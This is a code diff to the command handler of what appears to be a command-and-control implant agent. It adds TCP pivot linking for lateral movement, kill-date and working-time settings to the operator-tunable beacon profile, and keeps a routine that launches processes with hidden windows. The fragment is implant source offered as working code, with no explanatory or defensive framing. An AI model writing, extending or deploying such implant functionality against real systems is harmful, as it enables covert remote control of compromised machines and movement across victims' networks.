@@ -417,6 +417,14 @@ void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 		this->agent->pivotter->LinkPivotSMB(taskId, commandId, pipe, outPacker);
 	}
+	else if (pivotType == PIVOT_TYPE_TCP) {
+		ULONG addrSize = 0;
+		CHAR* addr   = (CHAR*)inPacker->UnpackBytes(&addrSize);
+		WORD  port   = inPacker->Unpack32();
+		ULONG taskId = inPacker->Unpack32();
+
+		this->agent->pivotter->LinkPivotTCP(taskId, commandId, addr, port, outPacker);
+	}
 }
 
 void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -544,7 +552,7 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG subcommand = inPacker->Unpack32();
 
-	if (subcommand == 1) {
+	if (subcommand == 1) { // sleep time
 		ULONG sleep  = inPacker->Unpack32();
 		ULONG jitter = inPacker->Unpack32();
 		ULONG taskId = inPacker->Unpack32();
@@ -558,7 +566,7 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(agent->config->sleep_delay);
 		outPacker->Pack32(agent->config->jitter_delay);
 	} 
-	else if (subcommand == 2) {
+	else if (subcommand == 2) { // download chunks size
 		ULONG size   = inPacker->Unpack32();
 		ULONG taskId = inPacker->Unpack32();
 		
@@ -568,6 +576,28 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(COMMAND_PROFILE);
 		outPacker->Pack32(subcommand);
 		outPacker->Pack32(agent->downloader->chunkSize);
+	}
+	else if (subcommand == 3) { // killdate
+		ULONG kill_date = inPacker->Unpack32();
+		ULONG taskId    = inPacker->Unpack32();
+
+		agent->config->kill_date = kill_date;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->kill_date);
+	}
+	else if (subcommand == 4) { // workingsize
+		ULONG workingtime = inPacker->Unpack32();
+		ULONG taskId      = inPacker->Unpack32();
+
+		agent->config->working_time = workingtime;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->working_time);
 	}
 }
 
@@ -747,8 +777,6 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
-
-
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
 
